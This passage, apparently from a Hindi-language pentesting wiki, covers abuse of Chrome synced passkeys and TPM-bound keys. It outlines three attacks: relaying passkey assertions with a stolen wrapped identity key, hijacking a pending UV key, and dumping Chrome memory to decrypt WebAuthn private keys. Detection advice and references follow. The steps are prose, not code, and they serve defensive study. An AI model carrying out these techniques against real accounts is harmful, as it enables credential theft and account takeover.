NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

इसका मतलब है कि **hardware binding, device से बाहर export को रोकता है, लेकिन compromised endpoint पर उसी user द्वारा इस्तेमाल को नहीं**।

### व्यावहारिक दुरुपयोग के तरीके

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome के LevelDB से `WebauthnCredentialSpecifics` enumerate करें।
   - Passkey login शुरू करें और नया WebAuthn challenge प्राप्त करें।
   - Cloud-authenticator request binding पर हस्ताक्षर करने के लिए, victim TPM पर चुराए गए `wrapped_identity_private_key` blob का उपयोग करें।
   - मिले assertion को relying party तक relay करें।
   - यह खास तौर पर तब उपयोगी है, जब RP `userVerification=preferred` स्वीकार करता हो या **`UV=0`** वाले assertions को अस्वीकार न करता हो।
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` हटाकर या valid signed `device/forget` operation भेजकर दोबारा onboarding करवाएँ।
   - यदि onboarding के बाद device **`uv_key_pending`** स्थिति में रह जाता है, तो attacker-नियंत्रित UV public key register करें।
   - यदि provider नई UV key के attestation / secure-hardware origin को verify नहीं करता, तो बाद में attacker key से किए गए signatures को **`UV=1`** माना जाता है।
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - Recovery या rejoin करवाएँ, ताकि Chrome synced-passkey master secret fetch करे।
   - `passkey_enclave_state` के दोबारा बनने/बदलने पर नज़र रखें, फिर Chrome memory dump करें, जब plaintext **security domain secret (SDS)** memory में मौजूद हो।
   - बरामद SDS का उपयोग करके हर `WebauthnCredentialSpecifics` record के encrypted fields decrypt करें और portable WebAuthn private keys बरामद करें।

### DFIR / detection के सुझाव

- `passkey_enclave_state` को **हटाए जाने/दोबारा बनाए जाने** पर नज़र रखें।<sup>[[4]](#references)</sup>
- गैर-ब्राउज़र processes द्वारा Chrome **`Sync Data\LevelDB`** तक असामान्य पहुँच पर alert करें।
- **Chrome memory dumps** या संदिग्ध cross-process memory access पर alert करें।
- Google Password Manager recovery PIN के बार-बार आने वाले prompts या अनपेक्षित re-onboarding की जाँच करें।
- ध्यान रखें कि synced passkeys के लिए WebAuthn **`signCount`** अक्सर उपयोगी नहीं होता, क्योंकि यह स्थिर रह सकता है; इसलिए clone का पता लगाने के पारंपरिक तरीके कमज़ोर होते हैं।

## References

- [1] [Unit 42 – उच्च-मूल्य वाले क्षेत्रों को निशाना बनाने वाले वर्षों तक अनदेखे रहे अभियानों की जाँच](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credential decryption → SYSTEM तक पहुँचने के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon के भीतर: relay network और गुप्त offensive operation की कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Passwordless authentication में एक नया attack surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Microsoft systems और networks पर हमले](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory data store वास्तव में कैसे काम करता है: NTDS.dit के भीतर (भाग 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass से passwords dump करना](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho ने Still Toolkit के साथ अपना cyber-espionage arsenal बढ़ाया](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW function और `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – सक्रिय sessions समाप्त करना](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
